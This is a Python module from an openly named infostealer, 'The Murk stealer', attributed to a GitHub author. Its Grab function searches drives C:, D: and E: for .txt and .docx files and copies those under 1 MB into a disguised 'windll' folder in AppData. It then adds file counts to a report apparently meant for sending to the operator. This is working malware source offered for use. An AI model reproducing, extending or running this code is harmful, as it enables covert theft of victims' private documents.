#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#


"""
All imports
"""
from shutil import copy2
from pathlib import Path
from os.path import getsize
from os import environ,sep,chdir,makedirs


"""
Function for copy .docx files
"""
def CopyDOCX(flist, path, count):
    for i in range (len(flist)):
        count+=1
        try:
            num = flist[i].rfind("\\")
            fname = flist[i][num+1:]
            print(flist[i])
            size = getsize(flist[i])
            if size < 1000000:
                copy2(flist[i],rf'{path}\windll\Files\File-Grabber\{fname[:-5]}___{count}.docx')
        except Exception as e:
                print(e)
    print("done")
    return count



"""
Function for copy .txt files
"""
def CopyTXT(flist, path, count):
    for i in range (len(flist)):
        count+=1
        try:
            num = flist[i].rfind("\\")
            fname = flist[i][num+1:]
            print(flist[i])
            size = getsize(flist[i])
            if size < 1000000:
                copy2(flist[i],rf'{path}\windll\Files\File-Grabber\{fname[:-4]}___{count}.txt')
        except Exception as e:
                print(e)
    print("done")
    return count



"""
main function
"""
def Grab(data):
    chdir("C:")
    try:
        mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
        try:
            makedirs(rf'{mainPath}\windll\Files\File-Grabber')
        except:
            pass
        try:
            data.append("\n\n📁<b>File-grabber</b>📁")
            """
            paths for search
            """
            fileDir = r"C:"
            fileDir1 = r"D:"
            fileDir2 = r"E:"
            fileExt = r"**\*.txt"
            fileExt1 = r"**\*.docx"
            txtCounter = 0
            docxCounter = 0
            print("fg on")
            """
            get all paths to files
            """
            try:
                filesTXT_С = list(str(_) for _ in Path(fileDir).glob(fileExt))
            except Exception as e:
                print(e)
            try:
                filesDOCX_С = list(str(_) for _ in Path(fileDir).glob(fileExt1))
            except Exception as e:
                print(e)
            try:
                filesTXT_D = list(str(_) for _ in Path(fileDir1).glob(fileExt))
            except Exception as e:
                print(e)
            try:
                filesDOCX_D = list(str(_) for _ in Path(fileDir1).glob(fileExt1))
            except Exception as e:
                print(e)
            try:
                filesTXT_E = list(str(_) for _ in Path(fileDir2).glob(fileExt))
            except Exception as e:
                print(e)
            try:
                filesDOCX_E = list(str(_) for _ in Path(fileDir2).glob(fileExt1))
            except Exception as e:
                print(e)
            """
            copy files
            """
            try:
               txtCounter= CopyTXT(filesTXT_С,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_С,mainPath,docxCounter)
            except Exception as e:
                print(e)
            try:
                txtCounter=CopyTXT(filesTXT_D,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_D,mainPath,docxCounter)
            except Exception as e:
                print(e)
            try:
                txtCounter=CopyTXT(filesTXT_E,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_E,mainPath,docxCounter)
            except Exception as e:
                print(e)
            data.append(f"\n∟📄files.txt: {txtCounter}")
            data.append(f"\n∟📒files.docx: {docxCounter}")
        except Exception as e:
            print(e)
        return data
    except:
        return data


